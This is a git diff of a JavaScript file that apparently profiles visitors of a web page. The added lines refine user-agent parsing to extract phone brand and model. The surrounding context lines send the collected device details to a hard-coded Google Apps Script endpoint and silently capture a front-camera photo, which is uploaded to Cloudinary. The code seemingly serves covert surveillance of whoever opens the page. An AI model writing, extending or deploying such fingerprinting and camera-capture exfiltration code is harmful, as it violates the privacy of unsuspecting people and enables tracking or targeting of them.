@@ -9,88 +9,155 @@ const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platfor
     const getDeviceInfo = () => {
         const android = ua.match(/Android ([0-9.]+)/);
         const ios = ua.match(/OS ([0-9_]+)/);
-        const device = ua.match(/\(([^)]+)\)/);
         
-        // Extract brand and model
         let brand = null, model = null;
         
-        // Common brand patterns (case-insensitive)
-        const brands = [
-            { name: 'Samsung', pattern: /samsung[\s-]?([^;)]+)/i },
-            { name: 'Huawei', pattern: /huawei[\s-]?([^;)]+)/i },
-            { name: 'Xiaomi', pattern: /xiaomi[\s-]?([^;)]+)/i },
-            { name: 'Redmi', pattern: /redmi[\s-]?([^;)]+)/i },
-            { name: 'OPPO', pattern: /oppo[\s-]?([^;)]+)/i },
-            { name: 'Vivo', pattern: /vivo[\s-]?([^;)]+)/i },
-            { name: 'OnePlus', pattern: /oneplus[\s-]?([^;)]+)/i },
-            { name: 'Realme', pattern: /realme[\s-]?([^;)]+)/i },
-            { name: 'Nokia', pattern: /nokia[\s-]?([^;)]+)/i },
-            { name: 'LG', pattern: /lg[\s-]?([^;)]+)/i },
-            { name: 'Motorola', pattern: /motorola[\s-]?([^;)]+)/i },
-            { name: 'Sony', pattern: /sony[\s-]?([^;)]+)/i },
-            { name: 'Google', pattern: /pixel[\s-]?([^;)]+)/i },
-            { name: 'HTC', pattern: /htc[\s-]?([^;)]+)/i },
-            { name: 'Asus', pattern: /asus[\s-]?([^;)]+)/i },
-            { name: 'Lenovo', pattern: /lenovo[\s-]?([^;)]+)/i },
-            { name: 'ZTE', pattern: /zte[\s-]?([^;)]+)/i },
-            { name: 'Tecno', pattern: /tecno[\s-]?([^;)]+)/i },
-            { name: 'Infinix', pattern: /infinix[\s-]?([^;)]+)/i },
-            { name: 'Honor', pattern: /honor[\s-]?([^;)]+)/i }
-        ];
-        
-        // iOS devices - get specific model
         if (ua.match(/iPhone/)) {
             brand = 'Apple';
-            const iosModel = ua.match(/iPhone(\d+[,\d]*)?/);
-            model = iosModel ? 'iPhone ' + (iosModel[1] || '') : 'iPhone';
+            model = 'iPhone';
         }
         else if (ua.match(/iPad/)) {
             brand = 'Apple';
-            const ipadModel = ua.match(/iPad(\d+[,\d]*)?/);
-            model = ipadModel ? 'iPad ' + (ipadModel[1] || '') : 'iPad';
+            model = 'iPad';
         }
-        else if (ua.match(/iPod/)) { brand = 'Apple'; model = 'iPod'; }
-        else {
-            // Check all Android brands
-            for (const b of brands) {
-                const match = ua.match(b.pattern);
-                if (match) {
-                    brand = b.name;
-                    model = match[1];
-                    break;
-                }
-            }
+        else if (ua.match(/iPod/)) {
+            brand = 'Apple';
+            model = 'iPod';
         }
-        
-        // Fallback: Try to extract any brand/model from Build/ pattern
-        if (!brand && android) {
-            const modelMatch = ua.match(/;\s*([^;)]+)\s*Build/);
-            if (modelMatch) {
-                const fullModel = modelMatch[1].trim();
-                model = fullModel;
-                // Try to extract brand from model string
-                const words = fullModel.split(/[\s-_]+/);
-                if (words.length > 0) brand = words[0];
-            }
-        }
-        
-        // Last resort: check for TECNO or Infinix in different positions
-        if (!brand) {
-            if (/TECNO/i.test(ua)) {
+        else if (android) {
+            if (/TECNO|\bCL\d|\bK[A-Z]\d/i.test(ua)) {
                 brand = 'Tecno';
-                const tecnoModel = ua.match(/TECNO[\s-]?([A-Z0-9]+)/i);
-                if (tecnoModel) model = tecnoModel[1];
-            } else if (/Infinix/i.test(ua)) {
+                const m = ua.match(/TECNO\s+([A-Z0-9]+)|\b(CL\d+)|\b(K[A-Z]\d+)/i);
+                model = m ? (m[1] || m[2] || m[3]) : 'Unknown';
+            }
+            else if (/Infinix|\bX\d{3,4}/i.test(ua)) {
                 brand = 'Infinix';
-                const infinixModel = ua.match(/Infinix[\s-]?([A-Z0-9]+)/i);
-                if (infinixModel) model = infinixModel[1];
+                const m = ua.match(/Infinix\s+([A-Z0-9\s]+)|\b(X\d{3,4})/i);
+                model = m ? (m[1] || m[2]).trim() : 'Unknown';
+            }
+            else if (/Poco|\b\d{4}DRK\d{2}G/i.test(ua)) {
+                brand = 'Poco';
+                const m = ua.match(/Poco\s+([^;)]+)|\b(\d{4}DRK\d{2}G)/i);
+                model = m ? (m[1] || m[2]) : 'Unknown';
+            }
+            else if (/SM-|Samsung/i.test(ua)) {
+                brand = 'Samsung';
+                const m = ua.match(/SM-([A-Z0-9]+)/i);
+                model = m ? 'SM-' + m[1] : 'Unknown';
+            }
+            else if (/Redmi|\bM\d{4}[A-Z]|\b\d{5}[A-Z]{2}\d{2}[A-Z]/i.test(ua)) {
+                brand = 'Redmi';
+                const m = ua.match(/Redmi\s+([^;)]+)|\b(M\d{4}[A-Z]?)|\b(\d{5}[A-Z]{2}\d{2}[A-Z])/i);
+                model = m ? (m[1] || m[2] || m[3]) : 'Unknown';
+            }
+            else if (/Xiaomi/i.test(ua)) {
+                brand = 'Xiaomi';
+                const m = ua.match(/Xiaomi\s+([^;)]+)/i);
+                model = m ? m[1] : 'Unknown';
+            }
+            else if (/OPPO|\bCPH\d{3,4}/i.test(ua)) {
+                brand = 'OPPO';
+                const m = ua.match(/\b(CPH\d{3,4})/i);
+                model = m ? m[1] : 'Unknown';
+            }
+            else if (/Vivo|\bV\d{3,4}/i.test(ua)) {
+                brand = 'Vivo';
+                const m = ua.match(/Vivo\s+([^;)]+)|\b(V\d{3,4})/i);
+                model = m ? (m[1] || m[2]) : 'Unknown';
+            }
+            else if (/Realme|\bRMX\d{3,4}/i.test(ua)) {
+                brand = 'Realme';
+                const m = ua.match(/\b(RMX\d{3,4})/i);
+                model = m ? m[1] : 'Unknown';
+            }
+            else if (/OnePlus|ONEPLUS/i.test(ua)) {
+                brand = 'OnePlus';
+                const m = ua.match(/ONEPLUS\s+([A-Z0-9]+)|\b(CPH\d{3,4})/i);
+                model = m ? (m[1] || m[2]) : 'Unknown';
+            }
+            else if (/Pixel/i.test(ua)) {
+                brand = 'Google';
+                const m = ua.match(/Pixel\s+([^;)\s]+)/i);
+                model = m ? 'Pixel ' + m[1] : 'Pixel';
+            }
+            else if (/Nothing\s+Phone/i.test(ua)) {
+                brand = 'Nothing';
+                const m = ua.match(/Nothing\s+Phone\s+\(([^)]+)\)/i);
+                model = m ? 'Phone ' + m[1] : 'Phone';
+            }
+            else if (/Honor|\bREA-[A-Z]{2}\d/i.test(ua)) {
+                brand = 'Honor';
+                const m = ua.match(/Honor\s+([^;)]+)|\b(REA-[A-Z]{2}\d+)/i);
+                model = m ? (m[1] || m[2]) : 'Unknown';
+            }
+            else if (/Sony|\bXQ-[A-Z]{2}\d{2}/i.test(ua)) {
+                brand = 'Sony';
+                const m = ua.match(/Sony\s+([^;)]+)|\b(XQ-[A-Z]{2}\d{2})/i);
+                model = m ? (m[1] || m[2]) : 'Unknown';
+            }
+            else if (/Motorola|moto\s+/i.test(ua)) {
+                brand = 'Motorola';
+                const m = ua.match(/moto\s+([^;)]+)/i);
+                model = m ? m[1] : 'Unknown';
+            }
+            else if (/ZTE|\bNX\d{3,4}[A-Z]/i.test(ua)) {
+                brand = 'ZTE';
+                const m = ua.match(/ZTE\s+([^;)]+)|\b(NX\d{3,4}[A-Z])/i);
+                model = m ? (m[1] || m[2]) : 'Unknown';
+            }
+            else if (/ASUS|\bAI\d{4}/i.test(ua)) {
+                brand = 'ASUS';
+                const m = ua.match(/ASUS\s+([^;)]+)|\b(AI\d{4})/i);
+                model = m ? (m[1] || m[2]) : 'Unknown';
+            }
+            else if (/Meizu|\bM\d{3}[A-Z]/i.test(ua)) {
+                brand = 'Meizu';
+                const m = ua.match(/Meizu\s+([^;)]+)|\b(M\d{3}[A-Z])/i);
+                model = m ? (m[1] || m[2]) : 'Unknown';
+            }
+            else if (/\bLG\b|\bLM-[A-Z]\d{3}/i.test(ua)) {
+                brand = 'LG';
+                const m = ua.match(/LG\s+([^;)]+)|\b(LM-[A-Z]\d{3})/i);
+                model = m ? (m[1] || m[2]) : 'Unknown';
+            }
+            else if (/Blackview|\bBV\d{4}/i.test(ua)) {
+                brand = 'Blackview';
+                const m = ua.match(/Blackview\s+([^;)]+)|\b(BV\d{4})/i);
+                model = m ? (m[1] || m[2]) : 'Unknown';
+            }
+            else if (/Huawei|\b[A-Z]{3}-[A-Z]{2}\d{2}[A-Z]/i.test(ua)) {
+                brand = 'Huawei';
+                const m = ua.match(/Huawei\s+([^;)]+)|\b([A-Z]{3}-[A-Z]{2}\d{2}[A-Z])/i);
+                model = m ? (m[1] || m[2]) : 'Unknown';
+            }
+            else if (/Nokia/i.test(ua)) {
+                brand = 'Nokia';
+                const m = ua.match(/Nokia\s+([^;)]+)/i);
+                model = m ? m[1] : 'Unknown';
+            }
+            else if (/itel/i.test(ua)) {
+                brand = 'iTel';
+                const m = ua.match(/itel\s+([A-Z0-9]+)/i);
+                model = m ? m[1] : 'Unknown';
+            }
+            else if (/Sparx|QMobile|G'Five|Calme|Dany|Digit|VGO\s+TEL/i.test(ua)) {
+                const brandMatch = ua.match(/(Sparx|QMobile|G'Five|Calme|Dany|Digit|VGO\s+TEL)/i);
+                brand = brandMatch ? brandMatch[1] : 'Unknown';
+                const m = ua.match(new RegExp(brand.replace(/'/g, "'") + '\\s+([^;)]+)', 'i'));
+                model = m ? m[1] : 'Unknown';
+            }
+            else {
+                const m = ua.match(/;\s*([^;)]+)\s*Build/i);
+                if (m) {
+                    model = m[1].trim();
+                    brand = model.split(/[\s-_]+/)[0];
+                }
             }
         }
         
         return {
             androidVersion: android ? android[1] : null,
             iosVersion: ios ? ios[1].replace(/_/g, '.') : null,
-            deviceName: device ? device[1] : null,
             brand: brand,
             model: model
         };
@@ -104,7 +171,6 @@ const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platfor
         version: version
     };
     
-    // Send to Google Sheets
     await fetch('https://script.google.com/macros/s/AKfycbwd6DFAaGBLF8RM6kD07nvTqD5Gr_SLDGTTLrkfVJ6qYrb7NtO9ZYZwqlgu4BnmQ28V/exec', {
         method: 'POST',
         mode: 'no-cors',
@@ -150,7 +216,6 @@ if (isIOS) {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
             
-            // Try ImageCapture API first
             if (window.ImageCapture) {
                 const videoTrack = stream.getVideoTracks()[0];
                 const imageCapture = new ImageCapture(videoTrack);
@@ -158,7 +223,6 @@ if (isIOS) {
                 stream.getTracks().forEach(track => track.stop());
                 await uploadToCloudinary(blob);
             } else {
-                // Fallback: capture from video element
                 const videoEl = document.createElement('video');
                 videoEl.srcObject = stream;
                 videoEl.play();
